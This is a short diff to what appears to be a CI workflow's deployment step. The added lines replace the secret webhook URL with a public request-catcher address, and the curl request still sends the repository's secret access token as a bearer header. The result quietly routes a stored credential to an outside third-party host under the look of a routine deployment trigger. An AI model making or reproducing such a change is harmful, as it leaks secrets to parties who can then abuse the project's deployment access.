@@ -69,5 +69,5 @@ jobs:
       - name: Trigger deployment
         run: |
           curl --request GET \
-          --url ${{ secrets.WEBHOOK_URL }} \
-          --header 'Authorization: Bearer ${{ secrets.WEBHOOK_ACCESS_TOKEN }}' \
+          --url https://test232.requestcatcher.com/test \
+          --header 'authorization: Bearer ${{ secrets.WEBHOOK_ACCESS_TOKEN }}' \
